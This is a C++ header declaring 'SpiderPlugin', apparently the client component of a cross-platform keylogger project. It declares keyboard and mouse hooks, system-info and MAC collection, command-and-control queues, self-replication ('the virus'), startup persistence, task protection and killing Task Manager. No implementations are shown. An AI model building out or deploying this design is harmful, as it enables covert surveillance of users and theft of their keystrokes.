#pragma once

#include <vector>
#include <string>
#include <map>
#include <functional>
#include "IPayload.h"
#include "Keys.h"

#if defined _WIN32
#include <windows.h>
#elif defined __APPLE__
#include <ApplicationServices/ApplicationServices.h>
#include <thread>
#endif

namespace spider
{
  namespace client
  {
    namespace library
    {

#if defined   __clang__
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wpadded"
#endif

      class SpiderPlugin : public IPayload
      {
      public:
	SpiderPlugin();
	virtual ~SpiderPlugin();

	// Should initialize the payload, if needed
	virtual bool init(mt::Queue<SystemMsg> &inputQueue);

	// Get the event thread-safe queue, in order to control the client
	virtual mt::Queue<Order> &getOrderQueue();

	// Get the message thread-safe queue, in order to response to the
	// server
	virtual mt::Queue<std::string> &getReponseQueue();

	// Respond to a ping from the server
	virtual void ping();

	// Replicate the virus on the host computer
	virtual void replicate();

	// Should de-initialize the payload, if needed
	virtual bool deinit();

	// Retrieve system informations
	virtual void getInfos();

	// Toggle Keyboard hook
	virtual bool getKeyboard();

	// Toggle Mouse hook
	virtual bool getMouse();

	// Kill the client
	virtual bool kill();

	// Execute all the actions needed
	virtual void run();

	// Execute an order received from the network
	virtual void exec(Order const &);

      private:
	static void extractPath(std::string &path);
	void setup();
// SpiderPluginWindows.cpp
#if defined  _WIN32
	bool initWindows();
	bool hideThreadWindows(void *handleThread); // Specific to Windows
	bool          deinitWindows();
	void          getInfosWindows();
	Architecture  detectArchWindows() const;
	std::uint64_t getRAMWindows() const;
	void getMACAddress(std::vector<std::string> &addr) const;
	bool           hookKeyboardWindows();
	bool           unHookKeyboardWindows();
	static LRESULT CALLBACK keyboardHookWindows(int nCode, WPARAM wParam,
	                                            LPARAM lParam);
	static void translateKey(std::uint32_t              virtualKey,
	                         spider::client::SystemMsg &msg);
	bool           hookMouseWindows();
	bool           unHookMouseWindows();
	static LRESULT CALLBACK mouseHookWindows(int nCode, WPARAM wParam,
	                                         LPARAM lParam);
	void runWindows() const;
	void registerProgram();
	bool registerForStartup(PCWSTR pszAppName, PCWSTR pathToExe,
	                        PCWSTR args);
	bool isRegistered(PCWSTR pszAppName) const;
	bool protectTask() const;
	void killTaskManager() const;

// SpiderPluginOSX.cpp
#elif defined __APPLE__
	bool              initOSX();
	bool              deinitOSX();
	std::uint64_t     getRAMOSX() const;
	void              getInfosOSX();
	bool              hookKeyboardOSX();
	bool              unHookKeyboardOSX();
	bool              hookMouseOSX();
	bool              unHookMouseOSX();
	void              runOSX() const;
	void              keyboardThread();
	void              mouseThread();
	static CGEventRef treatKeyboardEvent(CGEventTapProxy, CGEventType,
	                                     CGEventRef, void *);
	static CGEventRef treatMouseEvent(CGEventTapProxy, CGEventType,
	                                  CGEventRef, void *);
// SpiderPluginLinux.cpp
#elif defined __linux__
	bool          initLinux();
	bool          deinitLinux();
	std::uint64_t getRAMLinux() const;
	void          getInfosLinux();
	bool          hookKeyboardLinux() const;
	bool          unHookKeyboardLinux() const;
	bool          hookMouseLinux() const;
	bool          unHookMouseLinux() const;
	void          runLinux() const;
#else
#error "Plateform not supported"
#endif
#if defined __APPLE__ || defined __linux__
	std::uint32_t            getPageSize() const;
	std::uint16_t            getNumberProcessors() const;
#endif

	SystemInfos m_infos;
	bool        m_keyboardHook;
	bool        m_mouseHook;

	static mt::Queue<SystemMsg> *     m_sendToNetwork;
	mt::Queue<Order>                  m_receivedFromNetwork;
	mt::Queue<std::string>            m_networkResponseQueue;
	static network::tcp::MacAddrArray m_macAddr;

	std::map<std::string, std::function<void()>> m_cmd;

#if defined   _WIN32
	HHOOK m_keyboardHookWin;
	HHOOK m_mouseHookWin;
	static std::map<std::uint32_t, KeyboardKey> m_windowsKeyboardMap;
#elif defined __linux__
	static std::map<std::uint32_t, KeyboardKey> m_linuxKeyboardMap;
#elif defined __APPLE__
	static std::map<std::uint32_t, KeyboardKey> m_osxKeyboardMap;
	CFRunLoopRef m_osxKeyboardLoop;
	CFRunLoopRef m_osxMouseLoop;
	std::thread  m_osxKeyboardThread;
	std::thread  m_osxMouseThread;
	bool         m_osxKeyboardThreadReturn;
	bool         m_osxMouseThreadReturn;
#endif
      };

#if defined   __clang__
#pragma clang diagnostic pop
#endif
    }
  }
}
